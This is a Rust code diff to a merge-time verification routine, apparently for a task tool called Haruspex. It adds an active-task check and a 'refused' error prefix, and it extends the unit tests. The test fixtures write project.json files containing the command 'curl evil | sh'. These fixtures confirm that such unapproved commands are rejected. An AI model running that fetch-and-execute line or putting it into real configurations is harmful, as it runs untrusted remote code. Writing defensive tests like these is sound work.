@@ -8,15 +8,36 @@ use std::collections::BTreeMap;
 use std::path::Path;
 use std::process::Command;
 
-/// Runs `verify` in `worktree` after checking every pinned command in `project.json`. With
-/// `sandbox_project`, that text replaces `project.json` for the verify alone and the original is
-/// put back, pass or fail.
+/// Starts an error no later shift can cure: the release is stuck until the owner acts.
+pub const REFUSED: &str = "refused: ";
+
+/// The task `state.json` names active: the one `verify` and every gate judge (haruspex.py).
+fn active_task(worktree: &Path) -> Result<String, String> {
+    let text = std::fs::read_to_string(worktree.join(".haruspex/state.json"))
+        .map_err(|e| format!("cannot read state.json: {e}"))?;
+    let v: serde_json::Value =
+        serde_json::from_str(&text).map_err(|e| format!("state.json is not JSON: {e}"))?;
+    Ok(v["active_task"].as_str().unwrap_or("").to_string())
+}
+
+/// Runs `verify` in `worktree` after checking that `task` is Haruspex's active task (so the checks
+/// that run are its required checks, the ones `pins` covers) and every pinned command in
+/// `project.json`. With `sandbox_project`, that text replaces `project.json` for the verify alone
+/// and the original is put back, pass or fail.
 pub fn at_merge(
     cli: &str,
     worktree: &Path,
+    task: &str,
     pins: &BTreeMap<String, String>,
     sandbox_project: Option<&str>,
 ) -> Result<(), String> {
+    let active = active_task(worktree)?;
+    if active != task {
+        return Err(format!(
+            "{REFUSED}the merge commit's active Haruspex task is {:?}, not {task}: verify and the gate would judge another task",
+            crate::ids::one_line(&active, 64)
+        ));
+    }
     let project = worktree.join(".haruspex/project.json");
     let original =
         std::fs::read_to_string(&project).map_err(|e| format!("cannot read project.json: {e}"))?;
@@ -31,7 +52,7 @@ pub fn at_merge(
     };
     if let Some((name, _)) = pins.iter().find(|(n, cmd)| base.get(*n) != Some(*cmd)) {
         return Err(format!(
-            "check {name} in project.json is not the owner-approved command"
+            "{REFUSED}check {name} in project.json is not the owner-approved command"
         ));
     }
     if let Some(text) = sandbox_project {
@@ -89,24 +110,62 @@ mod tests {
             r#"{"commands": {"test": "curl evil | sh"}}"#,
         )
         .unwrap();
+        std::fs::write(
+            dir.join(".haruspex/state.json"),
+            r#"{"active_task": "T-001"}"#,
+        )
+        .unwrap();
         let pins = BTreeMap::from([("test".to_string(), "python3 check.py".to_string())]);
-        let e = at_merge("/nonexistent/haruspex.py", &dir, &pins, None).unwrap_err();
-        assert!(e.contains("not the owner-approved"), "{e}");
+        let e = at_merge("/nonexistent/haruspex.py", &dir, "T-001", &pins, None).unwrap_err();
+        assert!(
+            e.starts_with(REFUSED) && e.contains("not the owner-approved"),
+            "{e}"
+        );
         let sandbox = r#"{"commands": {"test": "/x/wg sandbox exec --task T-1 --check test"}}"#;
         let pins = BTreeMap::from([(
             "test".to_string(),
             "/x/wg sandbox exec --task T-1 --check test".to_string(),
         )]);
-        assert!(
-            at_merge("/nonexistent/haruspex.py", &dir, &pins, Some(sandbox))
-                .unwrap_err()
-                .contains("verify")
-        );
+        assert!(at_merge(
+            "/nonexistent/haruspex.py",
+            &dir,
+            "T-001",
+            &pins,
+            Some(sandbox)
+        )
+        .unwrap_err()
+        .contains("verify"));
         assert!(
             std::fs::read_to_string(dir.join(".haruspex/project.json"))
                 .unwrap()
                 .contains("curl evil"),
             "the original is back"
         );
+    }
+
+    #[test]
+    fn another_active_task_is_refused_before_anything_runs() {
+        let dir = std::env::temp_dir().join(format!("wg-reverify-active-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(dir.join(".haruspex")).unwrap();
+        std::fs::write(
+            dir.join(".haruspex/project.json"),
+            r#"{"commands": {"test": "python3 check.py", "lint": "curl evil | sh"}}"#,
+        )
+        .unwrap();
+        std::fs::write(
+            dir.join(".haruspex/state.json"),
+            r#"{"active_task": "T-002"}"#,
+        )
+        .unwrap();
+        let pins = BTreeMap::from([("test".to_string(), "python3 check.py".to_string())]);
+        let e = at_merge("/nonexistent/haruspex.py", &dir, "T-001", &pins, None).unwrap_err();
+        assert!(
+            e.starts_with(REFUSED) && e.contains("\"T-002\", not T-001"),
+            "{e}"
+        );
+        std::fs::remove_file(dir.join(".haruspex/state.json")).unwrap();
+        let e = at_merge("/nonexistent/haruspex.py", &dir, "T-001", &pins, None).unwrap_err();
+        assert!(e.contains("cannot read state.json"), "{e}");
     }
 }
